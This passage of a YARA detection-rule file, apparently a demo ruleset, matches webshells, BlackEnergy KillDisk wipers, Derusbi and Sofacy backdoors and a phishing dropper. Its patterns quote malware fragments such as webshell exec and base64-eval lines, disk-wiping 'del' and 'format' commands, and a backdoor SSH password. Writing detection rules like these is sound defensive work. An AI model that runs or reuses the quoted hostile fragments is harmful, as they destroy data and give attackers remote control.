\"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4\"\n      hash2 = \"5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c\"\n      hash3 = \"c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"if (!empty($unset_surl)) {setcookie(\\\"c99sh_surl\\\"); $surl = \\\"\\\";}\" fullword ascii\n      $s6 = \"@extract($_REQUEST[\\\"c99shcook\\\"]);\" fullword ascii\n      $s7 = \"if (!function_exists(\\\"c99_buff_prepare\\\"))\" fullword ascii\n   condition: \n      filesize < 685KB and 1 of them\n}\n\nrule Webshell_Ayyildiz_RID2DF5 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects Webshell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nikicat/web-malware-collection\"\n      date = \"2016-01-11 10:54:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0e25aec0a9131e8c7bd7d5004c5c5ffad0e3297f386675bccc07f6ea527dded5\"\n      hash2 = \"9c43aada0d5429f8c47595f79a7cdd5d4eb2ba5c559fb5da5a518a6c8c7c330a\"\n      hash3 = \"2ebf3e5f5dde4a27bbd60e15c464e08245a35d15cc370b4be6b011aa7a46eaca\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"echo \\\"<option value=\\\\\\\"\\\". strrev(substr(strstr(strrev($work_dir), \\\"/\\\"), 1)) .\\\"\\\\\\\">Parent Directory</option>\\\\n\\\";\" fullword ascii\n      $s1 = \"echo \\\"<option value=\\\\\\\"$work_dir\\\\\\\" selected>Current Directory</option>\\\\n\\\";\" fullword ascii\n   condition: \n      filesize < 112KB and all of them\n}\n\nrule Webshell_acid_FaTaLisTiCz_Fx_fx_p0isoN_sh3ll_x0rg_byp4ss_256_RID3D6B : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects Webshell - rule generated from from files acid.php, FaTaLisTiCz_Fx.txt, fx.txt, p0isoN.sh3ll.txt, x0rg.byp4ss.txt\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nikicat/web-malware-collection\"\n      date = \"2016-01-11 21:53:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549\"\n      hash2 = \"d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc\"\n      hash3 = \"65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<form method=\\\"POST\\\"><input type=hidden name=act value=\\\"ls\\\">\" fullword ascii\n      $s2 = \"foreach($quicklaunch2 as $item) {\" fullword ascii\n   condition: \n      filesize < 882KB and all of them\n}\n\nrule Webshell_AcidPoison_RID2E8F : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects Poison Sh3ll - Webshell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nikicat/web-malware-collection\"\n      date = \"2016-01-11 11:19:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549\"\n      hash3 = \"d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"elseif ( enabled(\\\"exec\\\") ) { exec($cmd,$o); $output = join(\\\"\\\\r\\\\n\\\",$o); }\" fullword ascii\n   condition: \n      filesize < 550KB and all of them\n}\n\nrule Webshell_acid_AntiSecShell_3_RID31C7 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects Webshell Acid\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nikicat/web-malware-collection\"\n      date = \"2016-01-11 13:37:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4\"\n      hash2 = \"7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549\"\n      hash3 = \"0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"echo \\\"<option value=delete\\\".($dspact == \\\"delete\\\"?\\\" selected\\\":\\\"\\\").\\\">Delete</option>\\\";\" fullword ascii\n      $s1 = \"if (!is_readable($o)) {return \\\"<font color=red>\\\".view_perms(fileperms($o)).\\\"</font>\\\";}\" fullword ascii\n   condition: \n      filesize < 900KB and all of them\n}\n\nrule Webshell_r57shell_2b_RID2E8F : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects Webshell R57\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nikicat/web-malware-collection\"\n      date = \"2016-01-11 11:19:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6\"\n      hash2 = \"aa957ca4154b7816093d667873cf6bdaded03f820e84d8f1cd5ad75296dd5d4d\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$connection = @ftp_connect($ftp_server,$ftp_port,10);\" fullword ascii\n      $s2 = \"echo $lang[$language.'_text98'].$suc.\\\"\\\\r\\\\n\\\";\" fullword ascii\n   condition: \n      filesize < 900KB and all of them\n}\n\nrule Webshell_zehir_RID2CC8 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects Webshell - rule generated from from files elmaliseker.asp, zehir.asp, zehir.txt, zehir4.asp, zehir4.txt\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nikicat/web-malware-collection\"\n      date = \"2016-01-11 10:03:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"16e1e886576d0c70af0f96e3ccedfd2e72b8b7640f817c08a82b95ff5d4b1218\"\n      hash2 = \"0c5f8a2ed62d10986a2dd39f52886c0900a18c03d6d279207b8de8e2ed14adf6\"\n      hash3 = \"cb9d5427a83a0fc887e49f07f20849985bd2c3850f272ae1e059a08ac411ff66\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"for (i=1; i<=frmUpload.max.value; i++) str+='File '+i+': <input type=file name=file'+i+'><br>';\" fullword ascii\n      $s2 = \"if (frmUpload.max.value<=0) frmUpload.max.value=1;\" fullword ascii\n   condition: \n      filesize < 200KB and 1 of them\n}\n\nrule Webshell_c99_4_RID2C0E : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects C99 Webshell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nikicat/web-malware-collection\"\n      date = \"2016-01-11 09:32:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4\"\n      hash2 = \"0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092\"\n      hash3 = \"d4424c61fe29d2ee3d8503f7d65feb48341ac2fc0049119f83074950e41194d5\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"displaysecinfo(\\\"List of Attributes\\\",myshellexec(\\\"lsattr -a\\\"));\" fullword ascii\n      $s2 = \"displaysecinfo(\\\"RAM\\\",myshellexec(\\\"free -m\\\"));\" fullword ascii\n      $s3 = \"displaysecinfo(\\\"Where is perl?\\\",myshellexec(\\\"whereis perl\\\"));\" fullword ascii\n      $s4 = \"$ret = myshellexec($handler);\" fullword ascii\n      $s5 = \"if (posix_kill($pid,$sig)) {echo \\\"OK.\\\";}\" fullword ascii\n   condition: \n      filesize < 900KB and 1 of them\n}\n\nrule BlackEnergy_Driver_USBMDM_RID304A : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatically generated YARA rule\"\n      author = \"Florian Roth\"\n      reference = \"http://www.welivesecurity.com/2016/01/03/blackenergy-sshbeardoor-details-2015-attacks-ukrainian-news-media-electric-industry/\"\n      date = \"2016-01-04 12:33:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7874a10e551377d50264da5906dc07ec31b173dee18867f88ea556ad70d8f094\"\n      hash2 = \"b73777469f939c331cbc1c9ad703f973d55851f3ad09282ab5b3546befa5b54a\"\n      hash3 = \"edb16d3ccd50fc8f0f77d0875bf50a629fa38e5ba1b8eeefd54468df97eba281\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"USB MDM Driver\" fullword wide\n      $s2 = \"KdDebuggerNotPresent\" fullword ascii\n      $s3 = \"KdDebuggerEnabled\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 180KB and all of them\n}\n\nrule BlackEnergy_Driver_AMDIDE_RID3026 : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatically generated YARA rule\"\n      author = \"Florian Roth\"\n      reference = \"http://www.welivesecurity.com/2016/01/03/blackenergy-sshbeardoor-details-2015-attacks-ukrainian-news-media-electric-industry/\"\n      date = \"2016-01-04 12:27:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"32d3121135a835c3347b553b70f3c4c68eef711af02c161f007a9fbaffe7e614\"\n      hash2 = \"3432db9cb1fb9daa2f2ac554a0a006be96040d2a7776a072a8db051d064a8be2\"\n      hash3 = \"90ba78b6710462c2d97815e8745679942b3b296135490f0095bdc0cd97a34d9c\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \" AMD IDE driver\" fullword wide\n      $s2 = \"SessionEnv\" fullword wide\n      $s3 = \"\\\\DosDevices\\\\{C9059FFF-1C49-4445-83E8-\" wide\n      $s4 = \"\\\\Device\\\\{C9059FFF-1C49-4445-83E8-\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 150KB and all of them\n}\n\nrule BlackEnergy_VBS_Agent_RID2EF0 : APT DEMO SCRIPT {\n   meta:\n      description = \"Detects VBS Agent from BlackEnergy Report - file Dropbearrun.vbs\"\n      author = \"Florian Roth\"\n      reference = \"http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/\"\n      date = \"2016-01-03 11:35:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"WshShell.Run \\\"dropbear.exe -r rsa -d dss -a -p 6789\\\", 0, false\" fullword ascii\n      $s1 = \"WshShell.CurrentDirectory = \\\"C:\\\\WINDOWS\\\\TEMP\\\\Dropbear\\\\\\\"\" fullword ascii\n      $s2 = \"Set WshShell = CreateObject(\\\"WScript.Shell\\\")\" fullword ascii\n   condition: \n      filesize < 1KB and 2 of them\n}\n\nrule DropBear_SSH_Server_RID2E43 : APT DEMO EXE FILE T1021_004 {\n   meta:\n      description = \"Detects DropBear SSH Server (not a threat but used to maintain access)\"\n      author = \"Florian Roth\"\n      reference = \"http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/\"\n      date = \"2016-01-03 11:07:01\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE, T1021_004\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Dropbear server v%s https://matt.ucc.asn.au/dropbear/dropbear.html\" fullword ascii\n      $s2 = \"Badly formatted command= authorized_keys option\" fullword ascii\n      $s3 = \"This Dropbear program does not support '%s' %s algorithm\" fullword ascii\n      $s4 = \"/etc/dropbear/dropbear_dss_host_key\" fullword ascii\n      $s5 = \"/etc/dropbear/dropbear_rsa_host_key\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them\n}\n\nrule BlackEnergy_BackdoorPass_DropBear_SSH_RID352E : APT DEMO EXE FILE T1021_004 {\n   meta:\n      description = \"Detects the password of the backdoored DropBear SSH Server - BlackEnergy\"\n      author = \"Florian Roth\"\n      reference = \"http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/\"\n      date = \"2016-01-03 16:02:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE, T1021_004\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"passDs5Bu9Te7\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and $s1\n}\n\nrule BlackEnergy_KillDisk_1_RID2F5E : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects KillDisk malware from BlackEnergy\"\n      author = \"Florian Roth\"\n      reference = \"http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/\"\n      date = \"2016-01-03 11:54:11\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"11b7b8a7965b52ebb213b023b6772dd2c76c66893fc96a18a9a33c8cf125af80\"\n      hash2 = \"5d2b1abc7c35de73375dd54a4ec5f0b060ca80a1831dac46ad411b4fe4eac4c6\"\n      hash3 = \"c7536ab90621311b526aefd56003ef8e1166168f038307ae960346ce8f75203d\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"system32\\\\cmd.exe\" fullword ascii\n      $s1 = \"system32\\\\icacls.exe\" fullword wide\n      $s2 = \"/c del /F /S /Q %c:\\\\*.*\" fullword ascii\n      $s3 = \"shutdown /r /t %d\" fullword ascii\n      $s4 = \"/C /Q /grant \" fullword wide\n      $s5 = \"%08X.tmp\" fullword ascii\n      $s6 = \"/c format %c: /Y /X /FS:NTFS\" fullword ascii\n      $s7 = \"/c format %c: /Y /Q\" fullword ascii\n      $s8 = \"taskhost.exe\" fullword wide\n      $s9 = \"shutdown.exe\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 8 of them\n}\n\nrule BlackEnergy_KillDisk_2_RID2F5F : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects KillDisk malware from BlackEnergy\"\n      author = \"Florian Roth\"\n      reference = \"http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/\"\n      date = \"2016-01-03 11:54:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"11b7b8a7965b52ebb213b023b6772dd2c76c66893fc96a18a9a33c8cf125af80\"\n      hash2 = \"5d2b1abc7c35de73375dd54a4ec5f0b060ca80a1831dac46ad411b4fe4eac4c6\"\n      hash3 = \"f52869474834be5a6b5df7f8f0c46cbc7e9b22fa5cb30bee0f363ec6eb056b95\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"%c:\\\\~tmp%08X.tmp\" fullword ascii\n      $s1 = \"%s%08X.tmp\" fullword ascii\n      $s2 = \".exe.sys.drv.doc.docx.xls.xlsx.mdb.ppt.pptx.xml.jpg.jpeg.ini.inf.ttf\" wide\n      $s3 = \"%ls_%ls_%ls_%d.~tmp\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 3 of them\n}\n\nrule WebShell_PHP_Web_Kit_v3_RID2F7A : DEMO FILE T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects PAS Tool PHP Web Kit\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/wordfence/grizzly\"\n      date = \"2016-01-01 11:58:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $php = \"<?php $\" \n      $php2 = \"@assert(base64_decode($_REQUEST[\" \n      $s1 = \"(str_replace(\\\"\\\\n\\\", '', '\" \n      $s2 = \"(strrev($\" ascii\n      $s3 = \"de'.'code';\" ascii\n   condition: \n      ( ( uint32 ( 0 ) == 0x68703f3c and $php at 0 ) or $php2 ) and filesize > 8KB and filesize < 100KB and all of ( $s* )\n}\n\nrule WebShell_PHP_Web_Kit_v4_RID2F7B : DEMO FILE T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects PAS Tool PHP Web Kit\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/wordfence/grizzly\"\n      date = \"2016-01-01 11:59:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $php = \"<?php $\" \n      $s1 = \"(StR_ReplAcE(\\\"\\\\n\\\",'',\" \n      $s2 = \";if(PHP_VERSION<'5'){\" ascii\n      $s3 = \"=SuBstr_rePlACe(\" ascii\n   condition: \n      uint32 ( 0 ) == 0x68703f3c and $php at 0 and filesize > 8KB and filesize < 100KB and 2 of ( $s* )\n}\n\nrule Derusbi_Kernel_Driver_WD_UDFS_RID31F5 : APT DEMO EXE FILE T1014 T1543_003 {\n   meta:\n      description = \"Detects Derusbi Kernel Driver\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family\"\n      date = \"2015-12-15 13:44:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1b449121300b0188ff9f6a8c399fb818d0cf53fd36cf012e6908a2665a27f016\"\n      hash2 = \"50174311e524b97ea5cb4f3ea571dd477d1f0eee06cd3ed73af39a15f3e6484a\"\n      hash3 = \"6cdb65dbfb2c236b6d149fd9836cb484d0608ea082cf5bd88edde31ad11a0d58\"\n      tags = \"APT, DEMO, EXE, FILE, T1014, T1543_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\\\\\.\\\\pipe\\\\usbpcex%d\" fullword wide\n      $x2 = \"\\\\\\\\.\\\\pipe\\\\usbpcg%d\" fullword wide\n      $x3 = \"\\\\??\\\\pipe\\\\usbpcex%d\" fullword wide\n      $x4 = \"\\\\??\\\\pipe\\\\usbpcg%d\" fullword wide\n      $x5 = \"$$$--Hello\" fullword ascii\n      $x6 = \"Wrod--$$$\" fullword ascii\n      $s1 = \"\\\\Registry\\\\User\\\\%s\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\" wide\n      $s2 = \"Update.dll\" fullword ascii\n      $s3 = \"\\\\Registry\\\\Machine\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\WMI\" wide\n      $s4 = \"\\\\Driver\\\\nsiproxy\" wide\n      $s5 = \"HOST: %s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and ( 2 of ( $x* ) or all of ( $s* ) )\n}\n\nrule Derusbi_Code_Signing_Cert_RID30D4 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects an executable signed with a certificate also used for Derusbi Trojan - suspicious\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family\"\n      date = \"2015-12-15 12:56:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Fuqing Dawu Technology Co.,Ltd.0\" fullword ascii\n      $s2 = \"XL Games Co.,Ltd.0\" fullword ascii\n      $s3 = \"Wemade Entertainment co.,Ltd0\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and 1 of them\n}\n\nrule XOR_4byte_Key_RID2BD9 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects an executable encrypted with a 4 byte XOR (also used for Derusbi Trojan)\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family\"\n      date = \"2015-12-15 09:24:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = { 85 C9 74 0A 31 06 01 1E 83 C6 04 49 EB F2 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and all of them\n}\n\nrule Sofacy_Malware_StrangeSpaces_RID3230 : APT DEMO EXE FILE G0007 RUSSIA {\n   meta:\n      description = \"Detetcs strange strings from Sofacy malware with many spaces\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/\"\n      date = \"2015-12-04 13:54:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE, G0007, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"Delete Temp Folder Service                                  \" fullword wide\n      $s3 = \" Operating System                        \" fullword wide\n      $s4 = \"Microsoft Corporation                                       \" fullword wide\n      $s5 = \" Microsoft Corporation. All rights reserved.               \" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and 3 of them\n}\n\nrule Sofacy_Malware_AZZY_Backdoor_1_RID325F : APT DEMO EXE FILE G0007 RUSSIA {\n   meta:\n      description = \"AZZY Backdoor - Sample 1\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/\"\n      date = \"2015-12-04 14:02:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE, G0007, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"advstorshell.dll\" fullword wide\n      $s1 = \"advshellstore.dll\" fullword ascii\n      $s2 = \"Windows Advanced Storage Shell Extension DLL\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 2 of them\n}\n\nrule Sofacy_AZZY_Backdoor_Implant_1_RID326B : APT DEMO EXE FILE G0007 RUSSIA {\n   meta:\n      description = \"AZZY Backdoor Implant 4.3 - Sample 1\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/\"\n      date = \"2015-12-04 14:04:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE, G0007, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\tf394kv.dll\" wide\n      $s2 = \"DWN_DLL_MAIN.dll\" fullword ascii\n      $s3 = \"?SendDataToServer_2@@YGHPAEKEPAPAEPAK@Z\" ascii\n      $s4 = \"?Applicate@@YGHXZ\" ascii\n      $s5 = \"?k@@YGPAUHINSTANCE__@@PBD@Z\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 2 of them\n}\n\nrule Sofacy_AZZY_Backdoor_HelperDLL_RID3242 : APT DEMO EXE FILE G0007 RUSSIA {\n   meta:\n      description = \"Dropped C&C helper DLL for AZZY 4.3\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/\"\n      date = \"2015-12-04 13:57:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE, G0007, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"snd.dll\" fullword ascii\n      $s1 = \"InternetExchange\" fullword ascii\n      $s2 = \"SendData\" \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule Sofacy_CollectorStealer_Gen1_RID31F6 : APT DEMO EXE FILE G0007 GEN RUSSIA {\n   meta:\n      description = \"Generic rule to detect Sofacy Malware Collector Stealer\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/\"\n      date = \"2015-12-04 13:44:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4e4606313c423b681e11110ca5ed3a2b2632ec6c556b7ab9642372ae709555f3\"\n      hash2 = \"92dcb0d8394d0df1064e68d90cd90a6ae5863e91f194cbaac85ec21c202f581f\"\n      tags = \"APT, DEMO, EXE, FILE, G0007, GEN, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"NvCpld.dll\" fullword ascii\n      $s1 = \"NvStop\" fullword ascii\n      $s2 = \"NvStart\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule Sofacy_CollectorStealer_Gen2_RID31F7 : APT DEMO EXE FILE G0007 GEN RUSSIA {\n   meta:\n      description = \"File collectors / USB stealers - Generic\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/\"\n      date = \"2015-12-04 13:45:01\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE, G0007, GEN, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"msdetltemp.dll\" fullword ascii\n      $s2 = \"msdeltemp.dll\" fullword wide\n      $s3 = \"Delete Temp Folder Service\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 2 of them\n}\n\nrule Sofacy_CollectorStealer_Gen3_RID31F8 : APT DEMO EXE FILE G0007 GEN RUSSIA {\n   meta:\n      description = \"File collectors / USB stealers - Generic\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/\"\n      date = \"2015-12-04 13:45:11\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE, G0007, GEN, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"NvCpld.dll\" fullword ascii\n      $s4 = \"NvStart\" fullword ascii\n      $s5 = \"NvStop\" fullword ascii\n      $a1 = \"%.4d%.2d%.2d%.2d%.2d%.2d%.2d%.4d\" fullword wide\n      $a2 = \"IGFSRVC.dll\" fullword wide\n      $a3 = \"Common User Interface\" fullword wide\n      $a4 = \"igfsrvc Module\" fullword wide\n      $b1 = \" Operating System                        \" fullword wide\n      $b2 = \"Microsoft Corporation                                       \" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 150KB and ( all of ( $s* ) and ( all of ( $a* ) or all of ( $b* ) ) )\n}\n\nrule PHISH_02Dez2015_dropped_p0o6543f_RID312C : DEMO EXE FILE MAL T1203 T1566_001 {\n   meta:\n      description = \"Phishing Wave - file p0o6543f.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://myonlinesecurity.co.uk/purchase-order-124658-gina-harrowell-clinimed-limited-word-doc-or-excel-xls-spreadsheet-malware/\"\n      date = \"2015-12-02 13:11:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, MAL, T1203, T1566_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"netsh.exe\" fullword wide\n      $s2 = \"routemon.exe\" fullword wide\n      $s3 = \"script=\" fullword wide\n      $s4 = 